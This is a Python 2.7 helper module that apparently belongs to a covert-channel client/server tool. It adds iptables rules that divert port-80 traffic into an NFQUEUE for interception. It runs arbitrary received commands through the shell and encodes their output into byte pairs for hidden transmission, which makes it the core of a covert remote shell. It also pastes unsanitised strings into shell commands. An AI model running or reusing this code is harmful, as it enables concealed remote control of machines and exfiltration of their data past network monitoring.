#!/usr/bin/env python2.7
#
# @desc This file contains helper method for both the client and server scripts.
#
# @author Evan Palmiotti
# @required os, subprocess, binascii
########################################################################################################
import os
import subprocess
import binascii

#
# @desc get ip address of current system and prints it for debugging
# @param IFACE - interface to operate on
# @return none
#
def ipstat(IFACE):
    ipcommand = 'ip -4 addr show '+IFACE+' | grep -oP \'(?<=inet\s)\d+(\.\d+){3}\''
    ps = subprocess.Popen(ipcommand,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    ip = ps.communicate()[0]
    print(ip)

#
# @desc if the rules are not already writen, make iptables rules to send incoming ans outgoing packets 
# with the destintation address in them to a queue to be intercepted
# @param dst - destination IP address
# @param QUEUE - IPTABLES Queue number
# @return none
#
def handleIptables(dst, QUEUE):
    iptablescmd = "sudo iptables -C OUTPUT -d "+dst+" -p tcp --sport 80 -j NFQUEUE --queue-num "+str(QUEUE)

    rule = os.system(iptablescmd)
    if str(rule) != '0':
        print("Adding IPTables rule...")
        iptablescmd = "sudo iptables -A OUTPUT -d "+dst+" -p tcp --sport 80 -j NFQUEUE --queue-num "+str(QUEUE)
        rule = os.system(iptablescmd)

    iptablescmd = "sudo iptables -C INPUT -s "+dst+" -p tcp --dport 80 -j NFQUEUE --queue-num "+str(QUEUE)

    rule = os.system(iptablescmd)
    if str(rule) != '0':
        print("Adding IPTables rule...")
        iptablescmd = "sudo iptables -A INPUT -s "+dst+" -p tcp --dport 80 -j NFQUEUE --queue-num "+str(QUEUE)
        rule = os.system(iptablescmd)

#
# @desc run a given command and compile the out put for transit
# @param command - command to be executed
# @param ENDCHAR - start and end deliminator for messages oveer the covert channel
# @return out - compiled and encoded command to be sent
#
def handleMessage(command, ENDCHAR):
    print("handling")

    print("Command: "+command)
    ps = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    out, err = ps.communicate()

    out=compiler(str(out).strip(), ENDCHAR)
    return out

#
# @desc compiles a plaintext message into am array of byte pairs encapsulated in the start/end message 
# deliminator
# @param message - plaintext message 
# @param ENDCHAR - start and end message deliminator
# @return msg - compiled message array
#
def compiler(message, ENDCHAR):
    print("Seniding message: "+message)
    counter=0
    msg=[]
    temp=''

    tmpmsg=[]
    counter=0
    for c in message:
        counter+=1
        temp+=c
        if counter % 2==0:
            tmpmsg.append(temp)
            temp=''
        elif counter == len(message):
            tmpmsg.append(temp)

    temp=''
    for cc in tmpmsg:
        temp=bin(int(binascii.hexlify(cc),16))
        temp=int(temp,2)
        msg.append(temp)
        temp=''
    msg.insert(0,ENDCHAR)
    msg.append(ENDCHAR)

    return msg
